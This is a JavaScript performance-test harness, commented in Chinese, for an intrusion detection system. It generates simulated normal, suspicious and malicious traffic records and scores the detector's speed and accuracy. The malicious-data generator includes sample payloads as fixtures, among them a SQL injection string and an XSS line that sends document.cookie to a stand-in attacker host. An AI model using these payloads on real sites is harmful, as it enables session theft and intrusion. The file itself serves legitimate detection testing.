/**
 * 入侵检测系统 - 性能测试工具
 * 用于测试系统在高负载、大量数据和并发情况下的性能表现
 */

class PerformanceTester {
  constructor(config = {}) {
    this.config = {
      testDuration: 30000, // 测试持续时间（毫秒）
      concurrentUsers: 10, // 并发用户数
      dataRate: 100, // 每秒数据处理量
      testScenarios: ['baseline', 'high_load', 'stress', 'endurance'], // 测试场景
      metricsEnabled: true, // 是否启用指标收集
      detailedLogging: false, // 是否启用详细日志
      ...config
    };
    
    // 性能指标
    this.performanceMetrics = {
      responseTimes: [],
      throughput: [],
      errorRates: [],
      resourceUsage: [],
      detectionAccuracy: {
        truePositives: 0,
        falsePositives: 0,
        trueNegatives: 0,
        falseNegatives: 0
      }
    };
    
    // 测试状态
    this.testStatus = {
      isRunning: false,
      currentScenario: null,
      startTime: null,
      endTime: null,
      duration: 0,
      completedIterations: 0,
      totalIterations: 0,
      errors: []
    };
    
    // 数据生成器
    this.dataGenerator = new PerformanceTestDataGenerator();
    
    // 模块引用
    this.modules = {};
    
    console.log('性能测试工具已初始化');
  }

  /**
   * 加载测试所需的模块
   */
  async loadModules() {
    try {
      if (typeof require !== 'undefined') {
        // Node.js环境
        this.modules = {
          InvasionDetector: require('../InvasionDetector.js'),
          DataCollector: require('../modules/DataCollector.js'),
          InvasionAnalyzer: require('../modules/InvasionAnalyzer.js'),
          InvasionResponder: require('../modules/InvasionResponder.js'),
          ModelIntegrationAdapter: require('../modules/ModelIntegrationAdapter.js'),
          InvasionInterceptionManager: require('../modules/InvasionInterceptionManager.js'),
          NetworkTrafficMonitor: require('../modules/NetworkTrafficMonitor.js'),
          SystemBehaviorMonitor: require('../modules/SystemBehaviorMonitor.js'),
          MonitoringAndReporting: require('../modules/MonitoringAndReporting.js')
        };
      } else {
        // 浏览器环境
        this.modules = {
          InvasionDetector: window.InvasionDetector,
          DataCollector: window.DataCollector,
          InvasionAnalyzer: window.InvasionAnalyzer,
          InvasionResponder: window.InvasionResponder,
          ModelIntegrationAdapter: window.ModelIntegrationAdapter,
          InvasionInterceptionManager: window.InvasionInterceptionManager,
          NetworkTrafficMonitor: window.NetworkTrafficMonitor,
          SystemBehaviorMonitor: window.SystemBehaviorMonitor,
          MonitoringAndReporting: window.MonitoringAndReporting
        };
      }
      
      console.log('模块加载完成');
      return true;
    } catch (error) {
      console.error('模块加载失败:', error);
      return false;
    }
  }

  /**
   * 运行所有测试场景
   */
  async runAllScenarios() {
    if (this.testStatus.isRunning) {
      console.warn('测试已经在运行中');
      return;
    }
    
    this.testStatus.isRunning = true;
    this.testStatus.startTime = new Date();
    
    const results = {};
    
    for (const scenario of this.config.testScenarios) {
      console.log(`开始运行测试场景: ${scenario}`);
      results[scenario] = await this.runTestScenario(scenario);
    }
    
    this.testStatus.endTime = new Date();
    this.testStatus.duration = this.testStatus.endTime - this.testStatus.startTime;
    this.testStatus.isRunning = false;
    
    console.log('所有测试场景运行完成');
    return results;
  }

  /**
   * 运行特定测试场景
   */
  async runTestScenario(scenario) {
    this.testStatus.currentScenario = scenario;
    this.performanceMetrics = this.resetPerformanceMetrics();
    
    const scenarioConfig = this.getScenarioConfig(scenario);
    const scenarioStartTime = Date.now();
    const scenarioEndTime = scenarioStartTime + scenarioConfig.duration;
    
    console.log(`测试场景配置:`, scenarioConfig);
    
    // 创建测试任务
    const tasks = [];
    for (let i = 0; i < scenarioConfig.concurrentUsers; i++) {
      tasks.push(this.runUserSimulation(i, scenarioConfig, scenarioEndTime));
    }
    
    // 等待所有任务完成
    await Promise.all(tasks);
    
    // 生成场景报告
    const scenarioResults = this.generateScenarioReport(scenario, scenarioConfig);
    
    console.log(`测试场景 ${scenario} 完成，结果:`, {
      throughput: scenarioResults.throughput, 
      avgResponseTime: scenarioResults.avgResponseTime,
      errorRate: scenarioResults.errorRate,
      detectionRate: scenarioResults.detectionRate
    });
    
    return scenarioResults;
  }

  /**
   * 获取场景配置
   */
  getScenarioConfig(scenario) {
    const baseConfig = {
      duration: this.config.testDuration,
      dataRate: this.config.dataRate,
      concurrentUsers: this.config.concurrentUsers,
      dataMix: { normal: 0.7, suspicious: 0.2, malicious: 0.1 }
    };
    
    const scenarioConfigs = {
      baseline: {
        ...baseConfig,
        concurrentUsers: 1,
        dataRate: 10,
        name: '基准测试'
      },
      high_load: {
        ...baseConfig,
        concurrentUsers: 50,
        dataRate: 500,
        name: '高负载测试'
      },
      stress: {
        ...baseConfig,
        concurrentUsers: 100,
        dataRate: 1000,
        duration: 60000,
        name: '压力测试'
      },
      endurance: {
        ...baseConfig,
        concurrentUsers: 20,
        dataRate: 200,
        duration: 300000, // 5分钟
        name: '持久测试'
      },
      spike: {
        ...baseConfig,
        concurrentUsers: 200,
        dataRate: 2000,
        duration: 10000,
        name: '峰值测试'
      },
      accuracy: {
        ...baseConfig,
        concurrentUsers: 5,
        dataRate: 50,
        dataMix: { normal: 0.5, suspicious: 0.3, malicious: 0.2 },
        name: '检测准确率测试'
      }
    };
    
    return scenarioConfigs[scenario] || baseConfig;
  }

  /**
   * 运行用户模拟
   */
  async runUserSimulation(userId, config, endTime) {
    console.log(`启动用户模拟 ${userId}`);
    
    // 初始化入侵检测器
    const detector = await this.initializeDetector();
    if (!detector) {
      console.error(`用户 ${userId} 初始化检测器失败`);
      return;
    }
    
    const intervalTime = 1000 / config.dataRate;
    let iteration = 0;
    
    while (Date.now() < endTime && this.testStatus.isRunning) {
      try {
        // 生成测试数据
        const dataType = this.getRandomDataType(config.dataMix);
        const testData = this.generateTestData(dataType, userId, iteration);
        
        // 记录开始时间
        const startTime = Date.now();
        
        // 处理检测
        await this.processDetection(detector, testData, dataType);
        
        // 记录响应时间
        const responseTime = Date.now() - startTime;
        this.performanceMetrics.responseTimes.push(responseTime);
        
        // 更新计数器
        this.testStatus.completedIterations++;
        iteration++;
        
        // 模拟真实用户行为间隔
        await this.sleep(Math.random() * intervalTime * 2);
      } catch (error) {
        this.logError(userId, iteration, error);
        this.performanceMetrics.errorRates.push({ userId, iteration, error: error.message });
      }
    }
    
    console.log(`用户模拟 ${userId} 完成，处理了 ${iteration} 次请求`);
  }

  /**
   * 初始化入侵检测器
   */
  async initializeDetector() {
    try {
      if (this.modules.InvasionDetector) {
        const detector = new this.modules.InvasionDetector({
          performanceMode: true,
          mockMode: true,
          enableCaching: true
        });
        
        await detector.initialize();
        await detector.startDetection();
        
        return detector;
      } else {
        // 返回一个模拟检测器
        return this.createMockDetector();
      }
    } catch (error) {
      console.error('初始化检测器失败:', error);
      return null;
    }
  }

  /**
   * 创建模拟检测器
   */
  createMockDetector() {
    return {
      async processDetection(data) {
        // 模拟处理延迟
        await new Promise(resolve => setTimeout(resolve, Math.random() * 10 + 5));
        
        // 模拟检测结果
        return {
          detection: Math.random() > 0.7,
          confidence: Math.random() * 0.4 + 0.6,
          type: data.type || 'unknown',
          severity: data.severity || 'medium'
        };
      }
    };
  }

  /**
   * 处理检测
   */
  async processDetection(detector, data, expectedType) {
    const result = await detector.processDetection(data);
    
    // 更新准确率统计
    this.updateAccuracyMetrics(result, expectedType);
    
    return result;
  }

  /**
   * 更新准确率指标
   */
  updateAccuracyMetrics(result, expectedType) {
    const { detection } = result;
    
    if (expectedType === 'malicious') {
      if (detection) {
        this.performanceMetrics.detectionAccuracy.truePositives++;
      } else {
        this.performanceMetrics.detectionAccuracy.falseNegatives++;
      }
    } else {
      if (detection) {
        this.performanceMetrics.detectionAccuracy.falsePositives++;
      } else {
        this.performanceMetrics.detectionAccuracy.trueNegatives++;
      }
    }
  }

  /**
   * 生成测试数据
   */
  generateTestData(dataType, userId, iteration) {
    switch (dataType) {
      case 'normal':
        return this.dataGenerator.generateNormalData(userId, iteration);
      case 'suspicious':
        return this.dataGenerator.generateSuspiciousData(userId, iteration);
      case 'malicious':
        return this.dataGenerator.generateMaliciousData(userId, iteration);
      default:
        return this.dataGenerator.generateNormalData(userId, iteration);
    }
  }

  /**
   * 获取随机数据类型
   */
  getRandomDataType(dataMix) {
    const rand = Math.random();
    const cumulativeProbability = {
      malicious: dataMix.malicious,
      suspicious: dataMix.malicious + dataMix.suspicious,
      normal: 1
    };
    
    if (rand < cumulativeProbability.malicious) return 'malicious';
    if (rand < cumulativeProbability.suspicious) return 'suspicious';
    return 'normal';
  }

  /**
   * 重置性能指标
   */
  resetPerformanceMetrics() {
    return {
      responseTimes: [],
      throughput: [],
      errorRates: [],
      resourceUsage: [],
      detectionAccuracy: {
        truePositives: 0,
        falsePositives: 0,
        trueNegatives: 0,
        falseNegatives: 0
      }
    };
  }

  /**
   * 生成场景报告
   */
  generateScenarioReport(scenario, config) {
    const { responseTimes, errorRates, detectionAccuracy } = this.performanceMetrics;
    const totalRequests = responseTimes.length + errorRates.length;
    
    // 计算响应时间统计
    const avgResponseTime = responseTimes.length > 0 
      ? responseTimes.reduce((sum, time) => sum + time, 0) / responseTimes.length 
      : 0;
    
    const maxResponseTime = responseTimes.length > 0 
      ? Math.max(...responseTimes) 
      : 0;
    
    const minResponseTime = responseTimes.length > 0 
      ? Math.min(...responseTimes) 
      : 0;
    
    // 计算错误率
    const errorRate = totalRequests > 0 
      ? (errorRates.length / totalRequests) * 100 
      : 0;
    
    // 计算吞吐量
    const durationSeconds = config.duration / 1000;
    const throughput = durationSeconds > 0 
      ? totalRequests / durationSeconds 
      : 0;
    
    // 计算检测准确率指标
    const { truePositives, falsePositives, trueNegatives, falseNegatives } = detectionAccuracy;
    const precision = truePositives + falsePositives > 0 
      ? truePositives / (truePositives + falsePositives) 
      : 0;
    
    const recall = truePositives + falseNegatives > 0 
      ? truePositives / (truePositives + falseNegatives) 
      : 0;
    
    const f1Score = precision + recall > 0 
      ? 2 * (precision * recall) / (precision + recall) 
      : 0;
    
    const detectionRate = (truePositives / (truePositives + falseNegatives)) * 100 || 0;
    
    return {
      scenario,
      config,
      summary: {
        totalRequests,
        successfulRequests: responseTimes.length,
        failedRequests: errorRates.length,
        duration: config.duration,
        throughput,
        avgResponseTime,
        maxResponseTime,
        minResponseTime,
        errorRate,
        detectionRate,
        precision: precision * 100,
        recall: recall * 100,
        f1Score: f1Score * 100
      },
      detailedMetrics: {
        responseTimes,
        errorRates,
        detectionAccuracy,
        resourceUsage: this.performanceMetrics.resourceUsage
      },
      timestamp: new Date().toISOString(),
      recommendations: this.generatePerformanceRecommendations({
        avgResponseTime,
        errorRate,
        throughput,
        f1Score,
        detectionRate
      })
    };
  }

  /**
   * 生成性能改进建议
   */
  generatePerformanceRecommendations(metrics) {
    const recommendations = [];
    
    // 响应时间建议
    if (metrics.avgResponseTime > 100) {
      recommendations.push('响应时间过长，建议优化检测算法或增加缓存机制');
    }
    
    // 错误率建议
    if (metrics.errorRate > 1) {
      recommendations.push(`错误率过高 (${metrics.errorRate.toFixed(2)}%)，建议检查系统稳定性`);
    }
    
    // 吞吐量建议
    if (metrics.throughput < 100) {
      recommendations.push('吞吐量较低，建议考虑并行处理或优化数据处理流水线');
    }
    
    // 检测准确率建议
    if (metrics.f1Score < 0.8) {
      recommendations.push('检测准确率偏低，建议优化模型或调整检测规则');
    }
    
    // 整体评估
    const overallScore = this.calculateOverallScore(metrics);
    if (overallScore >= 90) {
      recommendations.push('系统性能优秀，适合生产环境使用');
    } else if (overallScore >= 70) {
      recommendations.push('系统性能良好，但在高负载环境下可能需要进一步优化');
    } else if (overallScore >= 50) {
      recommendations.push('系统性能基本可接受，但需要进行性能优化');
    } else {
      recommendations.push('系统性能较差，不建议在生产环境中使用');
    }
    
    return recommendations;
  }

  /**
   * 计算整体性能评分
   */
  calculateOverallScore(metrics) {
    // 权重计算
    const weights = {
      responseTime: 0.2,  // 越低越好
      errorRate: 0.2,     // 越低越好
      throughput: 0.2,    // 越高越好
      f1Score: 0.4        // 越高越好
    };
    
    // 归一化分数（0-100）
    const responseTimeScore = Math.max(0, 100 - (metrics.avgResponseTime / 2)); // 200ms以上得0分
    const errorRateScore = Math.max(0, 100 - metrics.errorRate * 10); // 10%错误率得0分
    const throughputScore = Math.min(100, metrics.throughput); // 100以上得满分
    const f1ScoreScore = metrics.f1Score * 100;
    
    // 加权平均
    const weightedScore = 
      (responseTimeScore * weights.responseTime) +
      (errorRateScore * weights.errorRate) +
      (throughputScore * weights.throughput) +
      (f1ScoreScore * weights.f1Score);
    
    return Math.round(weightedScore);
  }

  /**
   * 记录资源使用情况
   */
  recordResourceUsage() {
    if (typeof process !== 'undefined' && process.memoryUsage) {
      const memUsage = process.memoryUsage();
      const cpuUsage = this.getCpuUsage();
      
      this.performanceMetrics.resourceUsage.push({
        timestamp: new Date().toISOString(),
        memory: {
          heapUsed: memUsage.heapUsed / (1024 * 1024), // MB
          heapTotal: memUsage.heapTotal / (1024 * 1024),
          rss: memUsage.rss / (1024 * 1024)
        },
        cpu: cpuUsage
      });
    }
  }

  /**
   * 获取CPU使用情况
   */
  getCpuUsage() {
    // 简单模拟CPU使用率
    return Math.random() * 50 + 10; // 10-60%
  }

  /**
   * 记录错误
   */
  logError(userId, iteration, error) {
    const errorInfo = {
      userId,
      iteration,
      timestamp: new Date().toISOString(),
      error: error.message,
      stack: error.stack
    };
    
    this.testStatus.errors.push(errorInfo);
    
    if (this.config.detailedLogging) {
      console.error(`用户 ${userId} 迭代 ${iteration} 错误:`, errorInfo);
    }
  }

  /**
   * 停止测试
   */
  stopTest() {
    this.testStatus.isRunning = false;
    console.log('测试已停止');
  }

  /**
   * 获取当前测试状态
   */
  getTestStatus() {
    return { ...this.testStatus };
  }

  /**
   * 导出测试报告
   */
  exportReport(format = 'json') {
    const report = {
      summary: {
        startTime: this.testStatus.startTime,
        endTime: this.testStatus.endTime,
        duration: this.testStatus.duration,
        completedIterations: this.testStatus.completedIterations,
        errors: this.testStatus.errors.length
      },
      performanceMetrics: this.performanceMetrics,
      testConfiguration: this.config
    };
    
    if (format === 'json') {
      return JSON.stringify(report, null, 2);
    }
    
    // 其他格式...
    return report;
  }

  /**
   * 工具函数：睡眠
   */
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

/**
 * 性能测试数据生成器
 */
class PerformanceTestDataGenerator {
  constructor() {
    this.invasionTypes = ['port_scan', 'brute_force', 'sql_injection', 'xss', 'malware', 'ddos', 'buffer_overflow', 'phishing'];
    this.normalActivities = ['browsing', 'file_transfer', 'email', 'video_streaming', 'remote_access', 'database_query'];
    this.suspiciousActivities = ['unusual_login', 'privilege_escalation', 'suspicious_file', 'data_exfiltration', 'scanning_activity'];
  }

  /**
   * 生成正常数据
   */
  generateNormalData(userId, iteration) {
    const activity = this.getRandomItem(this.normalActivities);
    
    return {
      type: 'normal',
      activity,
      userId,
      iteration,
      timestamp: new Date().toISOString(),
      source: this.generateRandomIp(192, 168, 1),
      target: this.generateRandomIp(8, 8, 8),
      dataVolume: Math.floor(Math.random() * 1024 * 1024) + 1024, // 1KB-1MB
      duration: Math.random() * 60 + 5, // 5-65秒
      metadata: this.generateActivityMetadata(activity)
    };
  }

  /**
   * 生成可疑数据
   */
  generateSuspiciousData(userId, iteration) {
    const activity = this.getRandomItem(this.suspiciousActivities);
    
    return {
      type: 'suspicious',
      activity,
      userId,
      iteration,
      timestamp: new Date().toISOString(),
      source: this.generateRandomIp(10, 0, 0),
      target: this.generateRandomIp(192, 168, 1),
      dataVolume: Math.floor(Math.random() * 1024 * 1024 * 5) + 1024 * 1024, // 1MB-6MB
      duration: Math.random() * 30 + 2, // 2-32秒
      metadata: this.generateActivityMetadata(activity)
    };
  }

  /**
   * 生成恶意数据
   */
  generateMaliciousData(userId, iteration) {
    const invasionType = this.getRandomItem(this.invasionTypes);
    
    return {
      type: 'malicious',
      attackType: invasionType,
      userId,
      iteration,
      timestamp: new Date().toISOString(),
      source: this.generateRandomIp(172, 16, 0),
      target: this.generateRandomIp(192, 168, 1),
      severity: ['high', 'critical'][Math.floor(Math.random() * 2)],
      payload: this.generateAttackPayload(invasionType),
      metadata: this.generateAttackMetadata(invasionType)
    };
  }

  /**
   * 生成随机IP地址
   */
  generateRandomIp(o1, o2, o3) {
    return `${o1}.${o2}.${o3}.${Math.floor(Math.random() * 255) + 1}`;
  }

  /**
   * 获取随机数组项
   */
  getRandomItem(array) {
    return array[Math.floor(Math.random() * array.length)];
  }

  /**
   * 生成活动元数据
   */
  generateActivityMetadata(activity) {
    const metadataTemplates = {
      browsing: {
        url: `https://example.com/page${Math.floor(Math.random() * 100)}`,
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        method: ['GET', 'POST'][Math.floor(Math.random() * 2)]
      },
      file_transfer: {
        fileName: `document${Math.floor(Math.random() * 1000)}.pdf`,
        fileSize: Math.floor(Math.random() * 1024 * 1024),
        transferType: ['upload', 'download'][Math.floor(Math.random() * 2)]
      },
      unusual_login: {
        username: `user${Math.floor(Math.random() * 100)}`,
        time: new Date().toISOString(),
        location: 'Unknown',
        failedAttempts: Math.floor(Math.random() * 3) + 1
      },
      privilege_escalation: {
        process: 'cmd.exe',
        userId: Math.floor(Math.random() * 1000),
        targetUserId: 0
      }
    };
    
    return metadataTemplates[activity] || {};
  }

  /**
   * 生成攻击载荷
   */
  generateAttackPayload(attackType) {
    const payloadTemplates = {
      port_scan: Array.from({length: Math.floor(Math.random() * 100) + 10}, (_, i) => 1024 + i).join(','),
      brute_force: `admin:password${Math.floor(Math.random() * 10000)}`,
      sql_injection: "' OR '1'='1' --",
      xss: "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
      malware: this.generateRandomHash(),
      ddos: `SYN flood to port ${[80, 443, 22, 3389][Math.floor(Math.random() * 4)]}`,
      buffer_overflow: 'A'.repeat(1024),
      phishing: 'Your account has been compromised. Click here to reset your password.'
    };
    
    return payloadTemplates[attackType] || 'Unknown payload';
  }

  /**
   * 生成攻击元数据
   */
  generateAttackMetadata(attackType) {
    const metadataTemplates = {
      port_scan: {
        scanType: ['SYN', 'TCP', 'UDP'][Math.floor(Math.random() * 3)],
        scanSpeed: Math.random() * 50 + 10, // 10-60 ports/sec
        targetPorts: [22, 80, 443, 3306, 5432]
      },
      brute_force: {
        service: ['SSH', 'FTP', 'RDP', 'SMTP'][Math.floor(Math.random() * 4)],
        attemptsPerMinute: Math.floor(Math.random() * 500) + 100,
        usernames: ['admin', 'root', 'user', 'test']
      },
      sql_injection: {
        vulnerableParameter: ['id', 'user', 'query', 'search'][Math.floor(Math.random() * 4)],
        affectedTable: ['users', 'products', 'accounts', 'orders'][Math.floor(Math.random() * 4)]
      }
    };
    
    return metadataTemplates[attackType] || {};
  }

  /**
   * 生成随机哈希值
   */
  generateRandomHash() {
    return Array.from({length: 64}, () => Math.random().toString(16)[2]).join('');
  }

  /**
   * 批量生成测试数据
   */
  generateBatchData(count, types = ['normal', 'suspicious', 'malicious']) {
    const data = [];
    
    for (let i = 0; i < count; i++) {
      const type = types[Math.floor(Math.random() * types.length)];
      let item;
      
      switch (type) {
        case 'normal':
          item = this.generateNormalData(0, i);
          break;
        case 'suspicious':
          item = this.generateSuspiciousData(0, i);
          break;
        case 'malicious':
          item = this.generateMaliciousData(0, i);
          break;
      }
      
      data.push(item);
    }
    
    return data;
  }
}

// 导出性能测试工具
if (typeof module !== 'undefined' && typeof module.exports !== 'undefined') {
  module.exports = {
    PerformanceTester,
    PerformanceTestDataGenerator
  };
} else if (typeof window !== 'undefined') {
  window.PerformanceTester = PerformanceTester;
  window.PerformanceTestDataGenerator = PerformanceTestDataGenerator;
}

// 提供一个简单的运行测试函数
async function runPerformanceTests() {
  const tester = new PerformanceTester();
  await tester.loadModules();
  const results = await tester.runAllScenarios();
  return results;
}

if (typeof module !== 'undefined' && typeof module.exports !== 'undefined') {
  module.exports.runTests = runPerformanceTests;
} else if (typeof window !== 'undefined') {
  window.runPerformanceTests = runPerformanceTests;
}
